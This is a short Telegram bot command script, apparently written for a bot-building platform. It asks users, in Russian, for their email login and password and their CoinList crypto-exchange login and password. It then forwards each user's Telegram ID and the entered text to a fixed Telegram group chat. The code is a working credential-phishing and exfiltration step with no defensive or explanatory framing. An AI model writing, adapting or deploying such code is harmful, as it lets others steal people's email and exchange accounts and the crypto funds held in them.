/*CMD
  command: send
  help: 
  need_reply: true
  auto_retry_time: 
  folder: 
  answer: 📌 Введите данные от *ПОЧТЫ* в виде (логин: пароль: ) и введите данные от *CoinList* в виде (логин:  пароль: )
  keyboard: 
  aliases: 
CMD*/

Api.sendMessage({ 
chat_id: "-1001506519468", 
text: "UserTelegramID: "+user.telegramid+"\nДанные: "+data.message, 
parse_mode: "Markdown"})

Bot.runCommand("main_menu");
